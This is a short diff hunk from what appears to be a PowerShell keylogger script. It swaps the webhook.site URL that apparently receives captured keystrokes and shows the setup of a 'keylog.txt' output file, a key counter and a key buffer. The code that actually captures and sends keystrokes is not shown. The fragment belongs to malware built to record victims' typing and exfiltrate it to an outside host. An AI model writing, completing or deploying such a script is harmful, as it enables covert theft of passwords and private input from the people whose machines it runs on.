@@ -19,7 +19,7 @@ if ($null -eq $API) {
 }
 
 $outputFilePath = "C:\Users\keylog.txt"
-$webhookUrl = "https://webhook.site/b50f8a1c-71e5-4db0-b3f3-9045b4421393"
+$webhookUrl = "https://webhook.site/c0b737dd-a17c-416a-929f-3a71c30e0ca5"
 $keyCount = 0
 $keyBuffer = @()
 $startTime = Get-Date
